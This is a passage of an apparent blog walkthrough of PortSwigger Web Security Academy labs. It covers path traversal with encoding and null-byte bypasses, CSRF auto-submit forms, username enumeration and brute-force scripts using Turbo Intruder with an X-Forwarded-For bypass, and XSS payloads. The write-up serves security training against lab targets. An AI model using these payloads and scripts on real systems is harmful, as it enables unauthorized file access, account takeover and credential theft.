<h3 id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-traversal-sequences-stripped-non-recursively">#</a></h3>
<br>
<p>Same as before, open BurpSuite Proxy and send to Repeater the request <code>GET /image?filename=53.jpg</code>. This request is been commanded by the browser to load the image <code>53.jpg</code> which is stored in the server. Let&rsquo;s try some path traversal attacks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># First try to exit var/www/images</span>
</span></span><span style="display:flex;"><span>../../../etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now try Absolute Path</span>
</span></span><span style="display:flex;"><span>/etc/passwd <span style="color:#75715e">#No Luck</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server may have specific defences against path traversal attacks</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># like removing suspicious characters (../)</span>
</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#75715e">#Success</span>
</span></span></code></pre></div><p><img loading="lazy" src="lab6.png" alt="attack"  />
</p>
<p>Even though the server removes all <code>../</code> characters, the remaining path is exactly what we want <code>../../../etc/passwd</code>.</p>
<hr>
<h3 id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">#</a></h3>
<br>
<p>Same as before, open BurpSuite Proxy and send to Repeater the request <code>GET /image?filename=53.jpg</code>. This request is been commanded by the browser to load the image <code>53.jpg</code> which is stored in the server. Let&rsquo;s try some path traversal attacks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># First try to exit var/www/images</span>
</span></span><span style="display:flex;"><span>../../../etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now try Absolute Path</span>
</span></span><span style="display:flex;"><span>/etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server may have specific defences against path traversal attacks</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># like removing suspicious characters (../)</span>
</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use of URL Encoding</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %2e = .</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %2f = /</span>
</span></span><span style="display:flex;"><span>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Double URL Encoding</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %25 = %</span>
</span></span><span style="display:flex;"><span>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252Fpasswd <span style="color:#75715e">#Success</span>
</span></span></code></pre></div><p><img loading="lazy" src="lab7.png" alt="attack"  />
</p>
<p>So in order to exploit this vulnearbility we need to encode our path traversal payload to Double URL Encoding.</p>
<hr>
<h3 id="lab-file-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-validation-of-start-of-path">#</a></h3>
<br>
<p>Same as before, open BurpSuite Proxy and send to Repeater the request <code>GET /image?filename=53.jpg</code>. This request is been commanded by the browser to load the image <code>53.jpg</code> which is stored in the server. Let&rsquo;s try some path traversal attacks.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># First try to exit var/www/images</span>
</span></span><span style="display:flex;"><span>../../../etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now try Absolute Path</span>
</span></span><span style="display:flex;"><span>/etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server may have specific defences against path traversal attacks</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># like removing suspicious characters (../)</span>
</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use of URL Encoding</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %2e = .</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %2f = /</span>
</span></span><span style="display:flex;"><span>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd <span style="color:#75715e">#Nope</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Double URL Encoding</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># %25 = %</span>
</span></span><span style="display:flex;"><span>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252Fpasswd <span style="color:#75715e">#Nothing</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server could take the absolute path and validate the base URL</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># For example here the absolute path is /var/www/images/53.jpg</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and the base URL is /var/www/images</span>
</span></span><span style="display:flex;"><span>/var/www/images/../../../etc/passwd <span style="color:#75715e">#Success</span>
</span></span></code></pre></div><p><img loading="lazy" src="lab8.png" alt="attack"  />
</p>
<hr>
<h3 id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass">#</a></h3>
<br>
<p>Same as before, open BurpSuite Proxy and send to Repeater the request <code>GET /image?filename=53.jpg</code>. This request is been commanded by the browser to load the image <code>53.jpg</code> which is stored in the server. Let&rsquo;s try some path traversal attacks.</p>
<p>The methods from the other labs don&rsquo;t apply here. Maybe the server checks the extention of the file, so let&rsquo;s try to use <code>NULL</code> character to end the line before the <code>.jpg</code> to bypass the check. We need to use the URL encoded value <code>%00</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>../../../etc.passwd%00.jpg
</span></span></code></pre></div><p><img loading="lazy" src="lab9.png" alt="attack"  />
</p>
<hr>
<h2 id="csrf">CSRF<a hidden class="anchor" aria-hidden="true" href="#csrf">#</a></h2>
<h3 id="lab-csrf-vulnerability-with-no-defenses">Lab: CSRF vulnerability with no defenses<a hidden class="anchor" aria-hidden="true" href="#lab-csrf-vulnerability-with-no-defenses">#</a></h3>
<p>Go to &ldquo;My account&rdquo; and log in with the given credentials <br></p>
<p>Username: wiener<br>
Password: peter</p>
<p>Now we can see a section to change our email.</p>
<p><img loading="lazy" src="lab14.png" alt="alt"  />
</p>
<p>If we enter an email while having Burp Proxy running, we can see the POST request to <code>/my-account/change-email HTTP/2</code> with body <code>email=newemail%40normal.com</code>.</p>
<p>So now we know that we need to construct an HTML that makes a POST request to <code>/my-account/change-email HTTP/2</code> but has as body our email.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://0a400076042ec1f4817e750d00c9009d.web-security-academy.net/my-account/change-email&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pwned@evil.com&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Now by using social engineering methods we can trick the user to run this HTML file. If the user loads this page and is already authorized to the website, then his email will be changed without him noticing.</p>
<p>Note: The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website.
For example we could send an email with an image tag, like <code>img src=&quot;http://attacker-server/csrf-exploit.html&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot;</code> redirecting to the above html file hosted on our server.</p>
<p>In this case we got a server ready by PortSwigger, so we just need to enter our payload and press the &ldquo;Deliver exploit to victim&rdquo;.</p>
<p><img loading="lazy" src="lab15.png" alt="alt"  />
</p>
<p>We have sucessfully solved the lab!</p>
<hr>
<h3 id="lab-csrf-where-token-validation-depends-on-request-method">Lab: CSRF where token validation depends on request method<a hidden class="anchor" aria-hidden="true" href="#lab-csrf-where-token-validation-depends-on-request-method">#</a></h3>
<p>In this case when we change the email we see the POST request containing a CSRF-token to prevent us from forging a fake request.</p>
<p><img loading="lazy" src="lab16.png" alt="alt"  />
</p>
<p>But if we change the request from POST to GET we can see its working. The defences for CSRF where applied only at POST requests, leaving the website vulnerable.</p>
<p><img loading="lazy" src="lab17.png" alt="alt"  />
</p>
<p>So now we can construct the appropriate HTML file that will submit this request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anything%40web-security-academy.net&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Enter the payload to PortSwigger server and press &ldquo;Deliver exploit to victim&rdquo;.</p>
<hr>
<h2 id="authentication">Authentication<a hidden class="anchor" aria-hidden="true" href="#authentication">#</a></h2>
<h3 id="lab-username-enumeration-via-different-responses">Lab: Username enumeration via different responses<a hidden class="anchor" aria-hidden="true" href="#lab-username-enumeration-via-different-responses">#</a></h3>
<p>Navigate to the login page, <code>/login</code>. Open Burp proxy and inspect the request/response when trying some random credentials.</p>
<p>For example, if we enter <code>admin:admin</code> then the request is the following.</p>
<p><img loading="lazy" src="lab18.png" alt="alt"  />
</p>
<p>So we have the parameters <code>username</code> and <code>password</code>. Let&rsquo;s use the Burp Interuder to bruteforce them. Right click and &ldquo;Sent to Intruder&rdquo;</p>
<p>In this lab challenge, we will use the given wordlists from portswigger academy.</p>
<p>First configure the positions of the parameters we want to fuzz and select as Attack type, Cluster Bomb in order to check each word of the username wordlist with each password in the password wordlist.</p>
<p><img loading="lazy" src="lab19.png" alt="alt"  />
</p>
<p>Here we have 101 usernames and 100 passwords, that means 10100 combinations. That&rsquo;s quite a lot.</p>
<p>If we start the attack we can see that the most responses have printed the message &ldquo;Invalid username&rdquo;. But after a couple of minutes one is different length and has printed &ldquo;Invalid password&rdquo;.</p>
<p><img loading="lazy" src="lab20.png" alt="alt"  />
</p>
<p>So we found the username and now we only need to find the password. Stop the attack and configure Burp Intruder only for the password, now we have only 100 requests to do, which is a ot faster.</p>
<p><img loading="lazy" src="lab21.png" alt="alt"  />
</p>
<p>The length of the response is different from the others, we might have something interesting here. Indeed this is password.</p>
<p><img loading="lazy" src="lab22.png" alt="alt"  />
</p>
<hr>
<h3 id="lab-username-enumeration-via-subtly-different-responses">Lab: Username enumeration via subtly different responses<a hidden class="anchor" aria-hidden="true" href="#lab-username-enumeration-via-subtly-different-responses">#</a></h3>
<p>Navigate to the login page, <code>/login</code>. Open Burp proxy and inspect the request/response when trying some random credentials. With <code>test:test</code> credentials we get the message <code>Invalid username or password.</code>.</p>
<p>Let&rsquo;s send the request to intruder and try to enumerate the username in case the server responds with a different message.</p>
<p>Go to &ldquo;Settings&rdquo; and then &ldquo;Grep Match&rdquo;, to add the message and check the following box, &ldquo;Flag result items with responses matching these expressions:&rdquo;</p>
<p><img loading="lazy" src="lab23.png" alt="alt"  />
</p>
<p>Now we can start the attack. Notice there is a username with flag not equal to 1, meaning that Burp din not find the expression we provided.</p>
<p><img loading="lazy" src="lab24.png" alt="alt"  />
</p>
<p>By inspecting the response it seems that the message that is printed is <code>Invalid username or password</code>, without a fullstop. That&rsquo;s propably a mistake and this is another message printed when the username is correct. Let&rsquo;s check if we are right.</p>
<p>Bruteforce password with username <code>adkit</code>.</p>
<p><img loading="lazy" src="lab25.png" alt="alt"  />
</p>
<p>We got <code>302 (Found)</code> status code, let&rsquo;s try the credentials. Great we just solved the lab.</p>
<hr>
<h3 id="lab-username-enumeration-via-response-timing">Lab: Username enumeration via response timing<a hidden class="anchor" aria-hidden="true" href="#lab-username-enumeration-via-response-timing">#</a></h3>
<p>Navigate to the login page, <code>/login</code>. Open Burp proxy. We have given some credentials, <code>wiener:peter</code>, let&rsquo;s check the response in case we provide the right password and in case we provide a very long one.</p>
<p><img loading="lazy" src="lab26.png" alt="alt"  />
</p>
<p>It seems that the server took very long time to process the second password. This means that we might be able to check the validity of the username/password based on the time needed to get the response back.</p>
<p>In order to enumerate the username first we need to set as password an arbitary long string.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>username<span style="color:#f92672">=</span>§test§&amp;password<span style="color:#f92672">=</span>aaaaaaaaaaaaa...aaaaaaa
</span></span></code></pre></div><p>But after running this attack with Burp Intruder we can see that there is no findings and that&rsquo;s becuase if we inpect one of the most recent requests we get the message, <code>You have made too many incorrect login attempts. Please try again in 30 minute(s).</code></p>
<p>The server propably blocks an IP address if it spams too many requests.</p>
<p>By adding the header <code>X-Forwarded-For</code> with a random IP we can bypass this validation.</p>
<p><u>Note:</u><br>
The <code>X-Forwarded-For (XFF)</code> request header is a de-facto standard
header for identifying the originating IP address of a client
connecting to a web server through a proxy server.
When a client connects directly to a server, the client&rsquo;s IP
address is sent to the server (and is often written to server
access logs). But if a client connection passes through any
forward or reverse proxies, the server only sees the final proxy&rsquo;s
IP address, which is often of little use. That&rsquo;s especially true
if the final proxy is a load balancer which is part of the same
installation as the server. So, to provide a more-useful client IP
address to the server, the X-Forwarded-For request header is used.</p>
<p><img loading="lazy" src="lab27.png" alt="alt"  />
</p>
<p>So we need to fuzz also the IP address of the <code>X-Forwarded-For</code> header. We can use a online generator to generate random IP Addresses.</p>
<p><img loading="lazy" src="lab28.png" alt="alt"  />
</p>
<p>This takes significantly more time to receive the response which propably means that the username is correct and the server tries to process the long password.</p>
<p><img loading="lazy" src="lab29.png" alt="alt"  />
</p>
<p><img loading="lazy" src="lab30.png" alt="alt"  />
</p>
<p>We have successfully solved the lab challenge.</p>
<hr>
<h3 id="lab-broken-brute-force-protection-ip-block">Lab: Broken brute-force protection, IP block<a hidden class="anchor" aria-hidden="true" href="#lab-broken-brute-force-protection-ip-block">#</a></h3>
<p>We have our credentials, <code>wiener:peter</code> and the victim&rsquo;s username, <code>carlos</code>.</p>
<p>If we try a few times to login with different password, we get the message, <code>You have made too many incorrect login attempts. Please try again in 1 minute(s).</code>.</p>
<p>Even if we provide the <code>X-Forwarded-For</code> header with a different IP Address in each request, we get the same message.</p>
<p>By sending a couple of failed requests we can easily detect that three false requests are permitted before blocking the IP address for one minute.</p>
<p>However, if we log in to our account a third time, the failed login attempts are reset. This allows us to fuzz both the username and password, but every three attempts, we must provide valid credentials. This process can be somewhat inconvenient using Burp&rsquo;s basic functionality, which is why we can leverage the Turbo Intruder extension.</p>
<p>Turbo Intruder allows us to write Python scripts to customize and optimize the fuzzing process.</p>
<p>Send the request by right clicking and selecting the &ldquo;Send to turbo intruder&rdquo;</p>
<p><img loading="lazy" src="lab31.png" alt="alt"  />
</p>
<p>Then configure the positions to fuzz by adding <code>%s</code> to the request.</p>
<p><img loading="lazy" src="lab32.png" alt="alt"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">queueRequests</span>(target, wordlists):
</span></span><span style="display:flex;"><span>    engine <span style="color:#f92672">=</span> RequestEngine(
</span></span><span style="display:flex;"><span>        endpoint<span style="color:#f92672">=</span>target<span style="color:#f92672">.</span>endpoint,
</span></span><span style="display:flex;"><span>        concurrentConnections<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        requestsPerConnection<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>,
</span></span><span style="display:flex;"><span>        pipeline<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> word2 <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#39;/home/kali/Desktop/htb/pass_burp.txt&#39;</span>):
</span></span><span style="display:flex;"><span>        word2 <span style="color:#f92672">=</span> word2<span style="color:#f92672">.</span>strip()  <span style="color:#75715e"># Remove any trailing whitespace/newlines</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> it <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>: 
</span></span><span style="display:flex;"><span>            engine<span style="color:#f92672">.</span>queue(target<span style="color:#f92672">.</span>req, [<span style="color:#e6db74">&#34;carlos&#34;</span>, word2])
</span></span><span style="display:flex;"><span>            it <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            engine<span style="color:#f92672">.</span>queue(target<span style="color:#f92672">.</span>req, [<span style="color:#e6db74">&#34;wiener&#34;</span>, <span style="color:#e6db74">&#39;peter&#39;</span>])
</span></span><span style="display:flex;"><span>            it <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># Reset the counter after every 3rd iteration</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleResponse</span>(req, interesting):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> interesting:
</span></span><span style="display:flex;"><span>        table<span style="color:#f92672">.</span>add(req)
</span></span></code></pre></div><p>Notice that concurrentConnections=1 is set to ensure each request is sent sequentially, waiting for a response before proceeding to the next. Using multiple connections increases the likelihood of requests being processed out of order, which could lead to the server blocking the IP address.</p>
<p>The attack was successful, the password is <code>love</code>.</p>
<hr>
<h3 id="lab-username-enumeration-via-account-lock">Lab: Username enumeration via account lock<a hidden class="anchor" aria-hidden="true" href="#lab-username-enumeration-via-account-lock">#</a></h3>
<p>We know that the there will be some kind of blocking after some failed attempts. Let&rsquo;s check this by sending the <code>/login</code> request to Turbo Intruder.</p>
<p>We want to fuzz the username with the wordlist and make at least 5 attepts so we can find if any username is triggering the account lock.</p>
<p><img loading="lazy" src="lab34.png" alt="alt"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">queueRequests</span>(target, wordlists):
</span></span><span style="display:flex;"><span>    engine <span style="color:#f92672">=</span> RequestEngine(
</span></span><span style="display:flex;"><span>        endpoint<span style="color:#f92672">=</span>target<span style="color:#f92672">.</span>endpoint,
</span></span><span style="display:flex;"><span>        concurrentConnections<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>,
</span></span><span style="display:flex;"><span>        requestsPerConnection<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>,
</span></span><span style="display:flex;"><span>        pipeline<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> word1 <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#39;/home/kali/Desktop/htb/usernames_burp.txt&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>):
</span></span><span style="display:flex;"><span>            engine<span style="color:#f92672">.</span>queue(target<span style="color:#f92672">.</span>req, [word1<span style="color:#f92672">.</span>strip(), <span style="color:#e6db74">&#34;test&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleResponse</span>(req, interesting):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> interesting:
</span></span><span style="display:flex;"><span>        table<span style="color:#f92672">.</span>add(req)
</span></span></code></pre></div><p>If we filter by length we can see two responses with different length from the others, the username is <code>oracle</code>.</p>
<p><img loading="lazy" src="lab33.png" alt="alt"  />
</p>
<p>Let&rsquo;s see if we can fuzz the password with this username. Send the request of <code>/login</code> to Burp Intruder and configure it with a Sniper Type. Then provide the password wordlist.</p>
<p>As expected, most of the responses have printed the message <code>You have made too many incorrect login attempts. Please try again in 1 minute(s).</code>, but there is one, with password <code>ashley</code> that doesn&rsquo;t print any message. This is our password.</p>
<hr>
<h3 id="lab-2fa-simple-bypass">Lab: 2FA simple bypass<a hidden class="anchor" aria-hidden="true" href="#lab-2fa-simple-bypass">#</a></h3>
<p>We have available the victim&rsquo;s credentials, <code>carlos:montoya</code> so let&rsquo;s try them. When we enter the credentials at <code>login</code> page then we get redirected to page <code>login2</code>. Let&rsquo;s go to home page by modifying the url.</p>
<p>It seems that we are logged in now, by going to my account page we are in carlos account. We bypassed the 2-Factor-Authentication cause it was not properly implemented. We were already in logged-in state when going to <code>login2</code> page so we were able to completely bypass it.</p>
<hr>
<h2 id="cross-site-scripting-xss">Cross-site Scripting (XSS)<a hidden class="anchor" aria-hidden="true" href="#cross-site-scripting-xss">#</a></h2>
<h3 id="lab-reflected-xss-into-html-context-with-nothing-encoded">Lab: Reflected XSS into HTML context with nothing encoded<a hidden class="anchor" aria-hidden="true" href="#lab-reflected-xss-into-html-context-with-nothing-encoded">#</a></h3>
<p>Navigate to the website and check every input point. The most classic functionality we should check first is the search box.</p>
<p>Insert something like <code>abc'&quot;&gt;&lt;&gt;#;//--</code> in order to check if the server encodes some of the special characters.</p>
<p><img loading="lazy" src="lab35.png" alt="alt"  />

<img loading="lazy" src="lab36.png" alt="alt"  />
</p>
<p>We can also use Burp Proxy to intercept the request and send it to Repeater to analyze it along with its response. Before our payload we sould insert a string, like <code>abc</code>, as it would be much easier searching for it and subsequently finding the injection point (the context).
<img loading="lazy" src="lab37.png" alt="alt"  />
</p>
<p>Now that we can see that our checking payload is reflected to the website without any encoding or protection, let&rsquo;s construct the real deal.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">domain</span>)<span style="color:#f92672">&lt;</span><span style="color:#e6db74">/script&gt; /</span><span style="color:#f92672">/</span> <span style="color:#a6e22e">Context</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">inside</span> <span style="color:#a6e22e">h1</span> <span style="color:#a6e22e">tag</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Alternatives
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">abc</span><span style="color:#960050;background-color:#1e0010">&#39;&#34;</span><span style="color:#f92672">&gt;&lt;&gt;&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">domain</span>)<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>We found the XSS vulnerability!</p>
<hr>
<h3 id="lab-stored-xss-into-html-context-with-nothing-encoded">Lab: Stored XSS into HTML context with nothing encoded<a hidden class="anchor" aria-hidden="true" href="#lab-stored-xss-into-html-context-with-nothing-encoded">#</a></h3>
<p>Navigate to the website and to the <code>/post</code> page. We can see that there is a comment section. When we write a comment and all the information that are nessesary we intercept the request.</p>
<p>We have a POST request to /post/comment with these parameters.</p>
<p><img loading="lazy" src="lab39.png" alt="alt"  />
</p>
<p>If our comment is not sanitized we could enter a payload to to the comment parameter to achieve Stored-XSS. Let&rsquo;s give it a try.</p>
<p><img loading="lazy" src="lab40.png" alt="alt"  />
</p>
<p>Great now everytime someone loads this page and consequently loads the comment section with or malicious payload, will get a javascript message with the domain. This could be used by a malicious actor to steal cookies sessions and more.</p>
<p><img loading="lazy" src="lab38.png" alt="alt"  />
</p>
<hr>
<h3 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch">Lab: DOM XSS in document.write sink using source location.search<a hidden class="anchor" aria-hidden="true" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch">#</a></h3>
<p>For this lab we will use a Burp Browser plugin, the DOM Invader. In this case it might be easy to detect the context of the injection in the javascript file, but in a more complicated website with minified js files it will be challenging and time consuming to do it manually.</p>
<p>First make sure DOM Invader and Postmessage Interception is on.</p>
<p><img loading="lazy" src="lab41.png" alt="alt"  />
</p>
<p>Then copy the canary and navigate to the website. Search all entry points by pasting the canary.</p>
<p>First let&rsquo;s examine the search functionality. After searching a random string we can see a new parameter to the url, <code>/?search=test</code>.</p>
<p>Now paste the canary to this parameter or the search bar and open Developer Tools with <code>F12</code>. We can see a new tab with the DOM Invader plugin.</p>
<p><img loading="lazy" src="lab42.png" alt="alt"  />
</p>
<p>There is new message to DOM tab. If we click at the stack trace and go to the console tab we can see exactly the canary hit in the code.</p>
<p><img loading="lazy" src="lab43.png" alt="alt"  />

<img loading="lazy" src="lab45.png" alt="alt"  />

<img loading="lazy" src="lab44.png" alt="alt"  />
</p>
<p>So now we know that our payload is injected here.
<img loading="lazy" src="lab46.png" alt="alt"  />
</p>
<p>In order for our payload work we need to close first the <code>img</code> tag.</p>
